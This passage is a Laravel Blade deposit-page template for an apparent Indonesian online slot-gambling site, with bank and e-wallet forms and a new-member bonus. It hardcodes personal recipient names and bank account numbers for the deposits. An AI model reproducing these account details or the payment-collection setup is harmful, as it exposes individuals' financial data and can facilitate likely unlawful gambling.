<?php
use App\Models\Setting;
use App\Models\Bank;

$setting = Setting::first();

$banks = Bank::all();

$bank_status = [];

//status active bank
foreach($banks as $bank){
    $bank_status[$bank->nama_bank] = $bank->status == 1;
}


?>

@extends('layouts.main')

@section('content')
    <style>
        .footer-body {
            display: none;
        }

        .backdrop {
            background-color: black;
        }

        .img_qr{
            max-width: 100%;
        }
    </style>
    @if (Session::has('success'))
        <script type="text/javascript">
            Swal.fire(
                'Deposit',
                'Mohon tunggu sebentar, deposit anda sedang kami proses / konfirmasi melalui live chat',
                'success'
            );
        </script>
    @endif
    @if (Session::has('error'))
        <script type="text/javascript">
            Swal.fire(
                'Deposit',
                'Mohon tunggu sebentar, deposit anda sebelumnya sedang kami proses / konfirmasi melalui live chat',
                'error'
            );
        </script>
    @endif
    <div class="content my01">
        @include('nav_saldo')
        <div class="container-wrapper acc" style="background-color: black">
            <div class="container container-box noSidePadding">

                <div class="head-content">
                    <div class="row no-gutters">
                        <div class="col-12">
                            <ng-content select="app-game-bals"></ng-content>
                        </div>
                        <div class="col-12 account_menu">

                            <div class="mdc-tab-bar" role="tablist">
                                <div class="mdc-tab-scroller">
                                    <div class="mdc-tab-scroller__scroll-area mdc-tab-scroller__scroll-area--scroll mdc-tab-scroller__scroll-x"
                                        style="margin-bottom: 0px;">
                                        <div class="mdc-tab-scroller__scroll-content">
                                            <ul class="list-inline">
                                                <li>
                                                    <div class="deposit-notice-menu">
                                                        <a role="tab" href="{{ URL::to('user-deposit') }}"
                                                            data-active='accountdeposit' class="mdc-tab"
                                                            aria-selected="false" tabindex="-1"
                                                            id="goog_2098347606-FIXED-0">
                                                            <span class="mdc-tab__content">

                                                                <span class="mdc-tab__text-label">
                                                                    Deposit
                                                                </span>

                                                            </span>

                                                            <span class="mdc-tab-indicator">
                                                                <span
                                                                    class="mdc-tab-indicator__content mdc-tab-indicator__content--underline"
                                                                    style=""></span>
                                                            </span>

                                                            <span class="mdc-tab__ripple mdc-ripple-upgraded"
                                                                style="--mdc-ripple-fg-size:91px; --mdc-ripple-fg-scale:1.8648; --mdc-ripple-fg-translate-start:76px, -10.5px; --mdc-ripple-fg-translate-end:30.6563px, -21.5px;"></span>
                                                            &nbsp;
                                                        </a>
                                                    </div>

                                                </li>
                                                <li>
                                                    <a role="tab" href="{{ URL::to('user-withdraw') }}"
                                                        data-active='accountwithdrawal' class="mdc-tab" aria-selected="true"
                                                        tabindex="0" id="goog_2098347606-FIXED-1">
                                                        <span class="mdc-tab__content">

                                                            <span class="mdc-tab__text-label">
                                                                Withdraw
                                                            </span>

                                                        </span>

                                                        <span class="mdc-tab-indicator">
                                                            <span
                                                                class="mdc-tab-indicator__content mdc-tab-indicator__content--underline"
                                                                style=""></span>
                                                        </span>

                                                        <span class="mdc-tab__ripple mdc-ripple-upgraded"
                                                            style="--mdc-ripple-fg-size:93px; --mdc-ripple-fg-scale:1.85613; --mdc-ripple-fg-translate-start:48.6875px, -6.5px; --mdc-ripple-fg-translate-end:31.1875px, -22.5px;"></span>
                                                    </a>

                                                </li>
                                                <li>
                                                    <a role="tab" href="{{ URL::to('user-history') }}"
                                                        data-active='accountlastdirecttransfer' class="mdc-tab"
                                                        aria-selected="false" tabindex="-1" id="goog_2098347606-FIXED-3">
                                                        <span class="mdc-tab__content">

                                                            <span class="mdc-tab__text-label">
                                                                5 Transaksi Terakhir

                                                            </span>

                                                        </span>

                                                        <span class="mdc-tab-indicator">
                                                            <span
                                                                class="mdc-tab-indicator__content mdc-tab-indicator__content--underline"
                                                                style=""></span>
                                                        </span>

                                                        <span class="mdc-tab__ripple mdc-ripple-upgraded"
                                                            style="--mdc-ripple-fg-size:102px; --mdc-ripple-fg-scale:1.83267; --mdc-ripple-fg-translate-start:-44.1875px, -35px; --mdc-ripple-fg-translate-end:34.1484px, -27px;"></span>
                                                    </a>

                                                </li>
                                                <li>
                                                    <a role="tab" href="{{ URL::to('user-pernyataan') }}"
                                                        data-active='accounthistory' class="mdc-tab" aria-selected="false"
                                                        tabindex="-1" id="goog_2098347606-FIXED-2">
                                                        <span class="mdc-tab__content">

                                                            <span class="mdc-tab__text-label">
                                                                Pernyataan

                                                            </span>

                                                        </span>

                                                        <span class="mdc-tab-indicator">
                                                            <span
                                                                class="mdc-tab-indicator__content mdc-tab-indicator__content--underline"
                                                                style=""></span>
                                                        </span>

                                                        <span class="mdc-tab__ripple mdc-ripple-upgraded"
                                                            style="--mdc-ripple-fg-size:102px; --mdc-ripple-fg-scale:1.83267; --mdc-ripple-fg-translate-start:-44.1875px, -35px; --mdc-ripple-fg-translate-end:34.1484px, -27px;"></span>
                                                    </a>

                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>


                        </div>
                    </div>
                </div>

                <div class="content">
                    <div class="deposit">
                        <div class="container">
                            <div class="row">
                                <div class="col-xs-12 col-md-8 content-form">

                                    <div class="methods_form" id="metode">
                                        <div class="box-wrapper plr-15">
                                            <div class="row   align-items-center">
                                                <div class="col-md-3 col-xs-12 text-center pay-title">
                                                    <div>
                                                        Konfirmasi Transfer Bank <br> (Manual Cek)
                                                    </div>
                                                </div>
                                                <div class="col-md-9 col-xs-12 d-flex flex-wrap">
                                                    <button onclick="btn_bca()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['BCA'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid" alt="bank_bca"
                                                                src="https://i.ibb.co.com/r2QFJ7Q/BCA.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_bni()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['BNI'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid" alt="bank_bni"
                                                                src="https://i.ibb.co.com/RBg3bjg/BNI.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_mandiri()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['MANDIRI'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid" alt="mandiri"
                                                                src="https://i.ibb.co.com/hY9dvyn/Mandiri.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_bri()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['BRI'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid" alt="bank_bri"
                                                                src="https://i.ibb.co.com/QJ2wnRt/BRI.png">
                                                        </div>
                                                    </button>
                                                    <input type="hidden" id="preload" value="1">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="box-wrapper plr-15">
                                            <div class="row   align-items-center">
                                                <div class="col-md-3 col-xs-12 text-center pay-title">
                                                    <div>
                                                        E-walet <br> (Manual Cek)
                                                    </div>
                                                </div>
                                                <div class="col-md-9 col-xs-12 d-flex flex-wrap">
                                                    <button onclick="btn_dana()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['DANA'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/mFFQMG3/DANAGOLD.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_linkaja()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['LINKAJA'] ? '' : 'hidden' ?>">
                                                        <div class="verti online">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/Jc2m2rN/LinkAja.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_ovo()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['OVO'] ? '' : 'hidden' ?>">

                                                        <div class="verti online">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/CP6bDQ9/OVO12.png">
                                                        </div>
                                                    </button>
                                                    <button onclick="btn_gopay()"
                                                        class="payment-methods payment-methods-items online <?= $bank_status['GOPAY'] ? '' : 'hidden' ?>">

                                                        <div class="verti online">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/8zNd1Kf/Gopay1.png">
                                                        </div>
                                                    </button>
                                                    <input type="hidden" id="preload" value="1">
                                                </div>
                                            </div>
                                        </div>

                                        <div class="box-wrapper plr-15">
                                            <div class="row  align-items-center">
                                                <div class="col-md-3 col-xs-12 text-center pay-title">
                                                    <div>
                                                        Pulsa <br> (Manual Cek)
                                                    </div>
                                                </div>
                                                <div class="col-md-9 col-xs-12 d-flex flex-wrap">

                                                    <button class="payment-methods payment-methods-items online" disabled>
                                                        <div class="verti offline">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/yYp46TL/XL.png">
                                                        </div>
                                                    </button>
                                                    <button class="payment-methods payment-methods-items offline" disabled>
                                                        <div class="verti offline">
                                                            <img class="img-fluid"
                                                                src="https://i.ibb.co.com/HYy3Mw3/Telkomsel.png">
                                                        </div>
                                                    </button>
                                                    <input type="hidden" id="preload" value="1">
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_bca" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="1">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_bca">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    Bank bluBCA </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Rekening Pengirim<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8  d-flex flex-wrap">
                                                                            <select class="form-control m-15"
                                                                                name="rek_pengirim" required>
                                                                                <option disabled selected>-
                                                                                    Silakan Pilih -</option>
                                                                                <option
                                                                                    value="{{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}">
                                                                                    {{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Bank Penerima<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <select
                                                                                class="form-control bank_list m-15 has-feedback has-success"
                                                                                data-plugin="bank_list" id="bank_name_5"
                                                                                name="bank_name">
                                                                                <option selected
                                                                                    value="{{ $bca->nama_bank . ' - ' . $bca->nama_penerima }}">JULIUS PUTRO MULIA
                                                                                    <!-- next bank -->
                                                                                </option>
                                                                                
                                                                            </select>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-xs-12 col-md-9">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS : <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                    <input type="hidden"
                                                                                        id="depo_acc_status"
                                                                                        value="ONLINE" />
                                                                                </div>

                                                                                <table
                                                                                    class="table table-borderless text-right info-box--001">
                                                                                    <tbody>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2">
                                                                                                <small> Nama Akun bank
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="">
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $bca->nama_penerima }}"
                                                                                                    class="copy-input" />

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">JULIUS PUTRO MULIA
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2">
                                                                                                <small> Rekening Bank No
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr class=" ">
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px">
                                                                                                <input id="info-copy-2"
                                                                                                    value="{{ $bca->no_rek }}"
                                                                                                    class="copy-input" />

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" "
                                                                                                        style="white-space: normal; word-break: break-word">004578027262
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR50,000.00 </span>
                                                                                                <input type="hidden"
                                                                                                    id="bank_min_deposit"
                                                                                                    class="min_deposit"
                                                                                                    value="10000" />
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                                <input type="hidden"
                                                                                                    id="bank_max_deposit"
                                                                                                    class="max_deposit"
                                                                                                    value="1000000000" />
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"> IDR
                                                                                                    0.00 </span>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <input type="hidden"
                                                                                            id="admin_fee"
                                                                                            value="IDR 0.00" />
                                                                                        <input type="hidden"
                                                                                            id="percent_check"
                                                                                            value="" />
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"> IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <input type="hidden"
                                                                                            id="subsidi"
                                                                                            value="IDR 0" />
                                                                                    </tbody>
                                                                                </table>

                                                                                <script>
                                                                                    $(document).ready(function() {
                                                                                        $('[data-toggle="tooltip"]').tooltip();
                                                                                    });
                                                                                </script>
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="m-15" style="width: 100%;">
                                                                                <div style="width: 100%;">
                                                                                    <select class="form-control promoList"
                                                                                         id="pilih_promo_bca"
                                                                                        name="bonus_id">
                                                                                        <option disabled selected
                                                                                            value="0">Pilih promo
                                                                                            tersedia</option>
                                                                                        @foreach ($bonus as $b)
                                                                                            <option
                                                                                                value="{{ $b->id }}"
                                                                                                
                                                                                                data-persentase="{{ $b->nominal }}">
                                                                                                {{ $b->keterangan }}
                                                                                                <!-- 
                                                                                                 data-min="@currency($b->minimal)" 
                                                                                                data-minin="{{ $b->minimal }}"   Minimal Transaksi:
                                                                                                @currency($b->minimal) -->
                                                                                            </option>
                                                                                        @endforeach
                                                                                    </select>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row info-lst" id="promoInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3"></div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="promoList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Promosi

                                                                                    <button
                                                                                        class="btn btn-click pull-right"
                                                                                        id="btn-clear-all-promo">CLEAR
                                                                                        PROMO</button>
                                                                                </div>
                                                                                <table
                                                                                    class="table table-borderless    text-right info-box--001">
                                                                                    <tbody>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="text-center"
                                                                                                colspan="2">
                                                                                                <span class=""
                                                                                                    style="font-weight: 700;  text-decoration:underline;">
                                                                                                    BONUS NEW MEMBER SLOT
                                                                                                    GAMES 20% </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">


                                                                                                <small i18n="">Jenis
                                                                                                    Bonus </small>
                                                                                            </td>

                                                                                        </tr>
                                                                                        <tr class=" ">

                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">

                                                                                                <span class="lbl"
                                                                                                    style="display:inline-block">
                                                                                                    Bonus Beri Depan </span>
                                                                                            </td>

                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small i18n="">Min
                                                                                                    Deposit </small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR50,000.00 </span>
                                                                                                <input type="hidden"
                                                                                                    class="promo"
                                                                                                    id="promo_min_amount"
                                                                                                    name="promo_min_amount"
                                                                                                    value="50000">

                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class=" ">

                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-9 col-md-6">
                                                                                                <small i18n="">Bonus
                                                                                                    Maksimum Dihadiahkan
                                                                                                </small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-9 col-md-6  text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR500,000.00
                                                                                                    <input type="hidden"
                                                                                                        class="promo"
                                                                                                        id="promo_max_amount"
                                                                                                        name="promo_max_amount"
                                                                                                        value="500000">
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class=" ">


                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Jumlah Deposit<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8">
                                                                            <div class=" d-flex flex-wrap">
                                                                                <input type="text" id="min_in_bca"
                                                                                    class="form-control m-15 price-tag"
                                                                                    placeholder="Masukan Nominal Deposit"
                                                                                    name="nominal" min="50000"
                                                                                    required>
                                                                            </div>
                                                                            <p class="min-max-notes">
                                                                                Min Claim Bonus<span
                                                                                    class="min-deposit-amount"
                                                                                    style="padding-right: 5px;"><b
                                                                                        id="min_bni">
                                                                                        100,000.00</b></span><br>
                                                                                Max Claim Bonus<span
                                                                                    class="max-deposit-amount"><b>
                                                                                        10,000,000.00</b></span>
                                                                            </p>
                                                                            <div class=" d-flex flex-wrap">
                                                                            </div>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Keterangan </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <input type="text"
                                                                                class="form-control m-15" id="ref_no"
                                                                                maxlength="35" minlength="5"
                                                                                name="keterangan"
                                                                                placeholder="No. Referensi / Nama Pengirim">
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4 ">
                                                                            <div class="font-weight-bold">
                                                                                Bukti Transfer </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <div class="file-drop-area m-15">
                                                                                <span class="btn btn-secondary "
                                                                                    i18n="">Pilih File</span>
                                                                                <span class="file-msg">
                                                                                    Bukti Transfer
                                                                                </span>
                                                                                <input class="file-input"
                                                                                    name="bukti_transfer" 
                                                                                    id="receipt" type="file"
                                                                                    accept="image/png, image/jpg, image/jpeg">
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-12 d-flex flex-wrap">
                                                                            <label>
                                                                                <input type="checkbox"
                                                                                    class="form-check-input"
                                                                                    id="exampleCheck1"
                                                                                    name="termcondition">
                                                                                Saya telah membaca dan menyetujui Syarat dan Selalu pastikan rekening pengirim atau rekening tujuan sesuai dengan data yang terdaftar pada menu Form Deposit Situs.

                                        Kami tidak memberikan toleransi apabila terjadi kesalahan pengiriman uang (Deposit) ke rekening yang bukan rekening SITUS kami.

                                        Transfer wajib memakai kode unik 888, Contoh 100.888.
                                                                                Harap melakukan konfirmasi deposit 1x saja, dan tunggu permohonan anda diproses untuk dapat melakukan deposit selanjutnya.
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <!--- second Tab end----->
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="m-15">
                                                                            <button type="button" class="btn btn-primary"
                                                                                id="backBtn"
                                                                                onclick="tutup_bank()">Back</button>

                                                                            <button type="submit"
                                                                                class="btn btn-secondary"
                                                                                id="submitBtn">Deposit</button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </form>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div id="modal_bni" style="display: none">
                                        <div class="box-wrapper plr-15">
                                            <div class="container-b3">
                                                <div class="row">
                                                    <div class="col-xs-12 col-md-12 content-form">
                                                        <style>
                                                            * {
                                                                -webkit-backface-visibility: visible;
                                                            }

                                                            select>option.disble {
                                                                background-color: #d4d4d4;
                                                            }
                                                        </style>
                                                        <form id="depositForm" class="needs-validation depositFormBni"
                                                            action="{{ URL::to('user-deposit') }}" method="POST"
                                                            enctype="multipart/form-data">
                                                            @csrf
                                                            <input type="hidden" name="type" value="1">
                                                            <input type="hidden" name="status" value="1">
                                                            <input type="hidden" name="bank_id" value="2">
                                                            <input type="hidden" name="bonus_persentase"
                                                                id="bonus_persentase_bni">
                                                            <div class="box-wrapper plr-15">
                                                                <div class="row d-flex">
                                                                    <div class="col-md-3 col-xs-4  ">
                                                                        <div class="font-weight-bold">
                                                                            Metode Penyetoran<span
                                                                                class="text-danger">*</span>
                                                                        </div>
                                                                    </div>
                                                                    <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                        <div class="radio_2 m-15 mt-2">
                                                                            <input id="radioBank5" checked=""
                                                                                type="radio" value="5">
                                                                            <label class=" " for="radioBank5">
                                                                                <span class="radio-title">
                                                                                    Bank BNI </span>
                                                                                <span class="marked">
                                                                                    <i class="icon-checkmark"></i>
                                                                                </span>
                                                                            </label>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="tab">
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Rekening Pengirim<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8  d-flex flex-wrap">
                                                                            <select class="form-control m-15"
                                                                                name="rek_pengirim" required>
                                                                                <option disabled selected>-
                                                                                    Silakan Pilih -</option>
                                                                                <option
                                                                                    value="{{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}">
                                                                                    {{ Auth::user()->bank . ' - ' . Auth::user()->no_rek }}
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4  ">
                                                                            <div class="font-weight-bold">
                                                                                Bank Penerima<span
                                                                                    class="text-danger">*</span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="col-md-9 col-xs-8 d-flex flex-wrap">
                                                                            <select
                                                                                class="form-control bank_list m-15 has-feedback has-success"
                                                                                data-plugin="bank_list" id="bank_name_5"
                                                                                name="bank_name">
                                                                                <option selected
                                                                                    value="{{ $bni->nama_bank . ' - ' . $bni->nama_penerima }}">TUIN
                                                                                </option>
                                                                            </select>
                                                                        </div>
                                                                    </div>

                                                                    <div class="row  info-lst" id="bankInfo_de001"
                                                                        style="">
                                                                        <div class="col-md-3">
                                                                            <div class="qrcode"></div>
                                                                        </div>
                                                                        <div class="col-xs-12 col-md-9 ">
                                                                            <div class="bankInfo-box" id="bankList">
                                                                                <div class="box-title">
                                                                                    <i class="icon-invoice i-invoice"></i>
                                                                                    Rincian Deposit Akun
                                                                                    <div class="pull-right acc_status">
                                                                                        STATUS :
                                                                                        <span
                                                                                            class="text-success">ONLINE</span>
                                                                                    </div>
                                                                                </div>

                                                                                <table
                                                                                    class="table table-borderless   text-right info-box--001">
                                                                                    <tbody>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Nama Akun bank </small>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <input id="info-copy-1"
                                                                                                    value="{{ $bni->nama_penerima }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-1"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span class=" ">TUIN
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left first">
                                                                                            <td class="col-xs-12 col-md-6 "
                                                                                                colspan="2">
                                                                                                <small>
                                                                                                    Rekening Bank No
                                                                                                </small>
                                                                                            </td>
                                                                                        </tr>

                                                                                        <tr>
                                                                                            <td class="col-xs-12 col-md-6"
                                                                                                colspan="2"
                                                                                                style="padding-bottom: 10px;">
                                                                                                <input id="info-copy-2"
                                                                                                    value="{{ $bni->no_rek }}"
                                                                                                    class="copy-input">

                                                                                                <a href="javascript:void(0);"
                                                                                                    data-sel="info-copy-2"
                                                                                                    class="btn btn-link btn-copy lbl">
                                                                                                    <span
                                                                                                        style="white-space: normal; word-break: break-word;">1814003294
                                                                                                    </span>
                                                                                                    <i
                                                                                                        class="icon-copy"></i>
                                                                                                </a>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td class="col-xs-6 col-md-6">
                                                                                                <small>Min Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl"
                                                                                                    id="min_modal_bni">
                                                                                                    IDR50,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2">
                                                                                            <td class="col-xs-6 col-md-6 ">
                                                                                                <small i18n="">Max
                                                                                                    Deposit</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right ">
                                                                                                <span class="lbl">
                                                                                                    IDR1,000,000,000.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Komisi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">

                                                                                                <span class="lbl">
                                                                                                    IDR 0.00
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                        <tr class="text-left tr_type2  ">
                                                                                            <td
                                                                                                class="col-xs-6  col-md-6 ">
                                                                                                <small
                                                                                                    i18n="">Subsidi
                                                                                                    Bank / Transaksi</small>
                                                                                            </td>
                                                                                            <td
                                                                                                class="col-xs-6 col-md-6 text-right">
                                                                                                <span class="lbl">
                                                                                                    IDR 0
                                                                                                </span>
                                                                                            </td>
                                                                                        </tr>
                                                                                    </tbody>
                                                                                </table>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="row d-flex">
                                                                        <div class="col-md-3 col-xs-4">
                                                                            <div class="font-weight-bold">
                                                                                Bonus </div>
